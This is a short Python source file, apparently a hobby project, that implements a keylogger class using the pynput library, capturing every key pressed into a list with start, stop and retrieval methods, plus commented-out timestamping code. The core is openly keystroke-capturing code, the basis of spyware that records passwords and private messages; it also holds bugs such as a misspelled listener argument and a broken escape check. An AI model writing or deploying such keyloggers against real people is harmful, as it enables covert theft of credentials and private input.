import datetime
from pynput import keyboard
from Ikey_logger import IKeyLogger


class Listener(IKeyLogger):

    def __init__(self):
        self.keys = []
        self.listen = None
        self.now = None
        self.key = None


    def on_press(self, key):
        self.key = key
        try:
            self.keys.append(key.char)
            print(self.keys)
        except:
            if str(key) == 'Key.space':
                self.keys.append(' ')
            else:
                self.keys.append(str(key))
        return key


    def start_logging(self) -> None:
        self.listen= keyboard.Listener(on_press= self.on_press, on_relles= self.stopme)
        self.listen.start()

    def stopme(self, key):
        if key == 'Key.esc':
            self.stop_logging()

    def stop_logging(self) -> None:
        if self.listen:
            exit()


    def get_logged_keys(self) -> list[str]:
        return self.keys




























# def up_to_dict_keys(self):
# /    if self.now in self.keys:
#         self.keys[self.now] += self.data
#     else:
#         self.keys[self.time()] = []
#     print(self.keys)
    # def __init__(self, data):
    #     self.keys = {}
    #     self.data = data
    #     self.now = None
    #
    #
    # def time(self):
    #     now = datetime.datetime.now()
    #     self.now = str(now.strftime("%m-%d-%Y %H:%M "))
    #     return self.now
    #
